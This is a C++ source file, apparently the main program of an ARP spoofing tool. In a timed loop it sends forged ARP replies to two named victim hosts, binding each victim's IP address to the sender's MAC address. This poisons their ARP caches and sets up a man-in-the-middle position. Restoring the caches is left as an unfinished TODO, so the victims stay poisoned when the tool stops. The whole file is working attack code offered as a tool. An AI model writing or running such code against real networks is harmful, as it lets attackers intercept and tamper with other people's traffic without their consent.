#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <signal.h>
#include "ARP_packet.h"
#include "NetworkInterface.h"
#include "ARP_packetManager.h"
#include "SpoofArguments.h"

bool loop = true;

void interruptHandler(int sig);

int main(int argc, char **argv) {
    try {
        SpoofArguments arguments(argc, argv);
        NetworkInterface networkInterface(arguments.getInterface());
        ARP_packetManager *arpPacketManager;

        signal(SIGINT, interruptHandler);
        signal(SIGTERM, interruptHandler);

        /* Perform ARP cache poison */
        if (arguments.getProtocol() == "arp") {
            arpPacketManager = ARP_packetManager::getInstance();
            arpPacketManager->init(&networkInterface);
            while(loop) {
                ARP_packet *arpReply1 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim2Ipv4Address(),
                        arguments.getVictim1MacAddress(),
                        arguments.getVictim1Ipv4Address()
                );
                ARP_packet *arpReply2 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim1Ipv4Address(),
                        arguments.getVictim2MacAddress(),
                        arguments.getVictim2Ipv4Address()
                );

                arpPacketManager->send(arpReply1);
                arpPacketManager->send(arpReply2);

                delete arpReply1;
                delete arpReply2;

                usleep((__useconds_t) (arguments.getTime() * 1000));
            }
            arpPacketManager->clean();
        }

        //TODO reset cache
    }
    catch (InvalidArgumentsException &e) {
        cerr << e.what() << endl;
        SpoofArguments::printUsage();
        return EXIT_FAILURE;
    }
    catch (exception &e) {
        cerr << e.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

void interruptHandler(int sig) {
    loop = false;
}